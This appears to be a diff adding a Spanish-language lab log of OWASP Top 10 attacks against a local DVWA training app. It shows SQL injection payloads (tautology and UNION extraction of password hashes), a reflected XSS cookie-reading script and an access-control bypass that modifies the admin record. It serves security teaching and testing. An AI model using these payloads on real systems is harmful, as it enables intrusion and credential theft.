@@ -1,0 +1,36 @@
+=== A03:2021 Inyeccion - SQL Injection (/vulnerabilities/sqli/)
+--- Normal: id=1
+First name: admin
+Surname: admin
+--- Tautologia: id=1' OR '1'='1  (devuelve TODOS los usuarios)
+First name: admin
+First name: Gordon
+First name: Hack
+First name: Pablo
+First name: Bob
+--- UNION: extrae usuario y hash de contrasena de la tabla users
+First name: admin | Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+First name: gordonb | Surname: e99a18c428cb38d5f260853678922e03
+First name: 1337 | Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+First name: pablo | Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+First name: smithy | Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+--- Version del motor: UNION SELECT @@version
+First name: 11.4.13-MariaDB-ubu2404 | Surname: dvwa
+
+=== A03:2021 Inyeccion - Cross-Site Scripting reflejado (/vulnerabilities/xss_r/)
+Hello <script>alert(document.cookie)</script>
+-> El payload regresa SIN codificar: se ejecuta en el navegador de la victima (robo de cookie de sesion; la cookie no tiene HttpOnly)
+--- Cookies de una sesion nueva (sin HttpOnly ni SameSite):
+Set-Cookie: security=low; path=/
+Set-Cookie: PHPSESSID=<id>; expires=Fri, 20 Nov 2026 03:07:11 GMT; Max-Age=86400; path=/; domain=127.0.0.1
+
+=== A01:2021 Control de acceso roto (/vulnerabilities/authbypass/)
+--- Sesion de gordonb (usuario normal, NO admin):
+This page should only be accessible by the admin user. Your challenge is to gain access to the features using one of the other users, for example 
+--- gordonb llama directo a la API de datos de usuarios (deberia ser 403):
+[{"user_id":"1","first_name":"admin","surname":"admin"},{"user_id":"2","first_name":"Gordon","surname":"Brown"},{"user_id":"3","first_name":"Hack","surname":"Me"},{"user_id":"4","first_name":"Pablo","surname":"Picasso"},{"user_id":"5","first_name":"Bob","surname":"Smith"}]  [HTTP 200]
+--- gordonb MODIFICA los datos del usuario id=1 (admin):
+{"result":"ok"}  [HTTP 200]
+{"user_id":"1","first_name":"Hacked","surname":"ByGordon"}
+--- restaurar admin:
+{"result":"ok"}
